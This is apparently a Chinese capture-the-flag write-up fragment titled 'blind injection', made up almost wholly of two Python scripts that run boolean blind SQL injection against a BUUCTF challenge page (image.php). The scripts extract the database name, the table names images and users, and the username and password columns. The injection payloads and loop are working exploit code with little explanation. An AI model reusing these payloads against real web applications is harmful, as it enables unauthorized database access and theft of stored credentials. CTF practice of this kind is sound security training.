## 盲注

``` python
import requests,time

characters = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'    #匹配用的字符串
if __name__ == "__main__":
    url = "http://14a678dd-8d56-406a-986a-bbbcea37ceb3.node3.buuoj.cn/image.php?id=\\0&path="
    result=""
    for i in range(1,23):
        for character in characters:
            path="+or+1%3dif(ascii(substr(database(),{},1))%3d{},1,0)%23".format(i,ord(character))
            response = requests.get(url=url+path)
            if(b"H" in response.content):
                result+=character
                break
        print(result)
```

数据库ciscnfinal

``` python
import requests,time

characters = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'    #匹配用的字符串
if __name__ == "__main__":
    url = "http://14a678dd-8d56-406a-986a-bbbcea37ceb3.node3.buuoj.cn/image.php?id=\\0&path="
    result=""
    for i in range(1,23):
        for character in characters:
            path="+or+1%3dif(ascii(substr((select distinct table_name from information_schema.columns where TABLE_SCHEMA=database() limit 1,1),{},1))%3d{},1,0)%23".format(i,ord(character))
            response = requests.get(url=url+path)
            if(b"H" in response.content):
                result+=character
                
                break
        print(result)
```
表名images users

表users
username
password